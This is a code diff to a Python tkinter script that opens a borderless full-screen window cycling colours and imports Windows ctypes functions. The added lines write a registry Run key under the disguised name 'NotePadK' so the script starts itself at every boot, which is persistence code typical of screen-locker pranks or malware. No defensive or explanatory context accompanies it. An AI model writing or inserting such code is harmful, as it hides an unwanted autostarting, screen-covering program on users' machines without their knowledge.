@@ -1,4 +1,8 @@
 import tkinter as tk
+import time
+import os
+
+os.system(r'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "NotePadK" /t REG_SZ /d "main.py"')
 
 def change_color():
     colors = ["red", "green", "blue", "yellow", "purple"]
@@ -12,6 +16,8 @@ vwin = tk.Tk()
 vwin.overrideredirect(True)
 vwin.geometry("{0}x{1}+0+0".format(vwin.winfo_screenwidth(), vwin.winfo_screenheight()))
 vwin.after(1, change_color)
+
+time.sleep(1)
 
 from ctypes import windll
 from ctypes import c_int
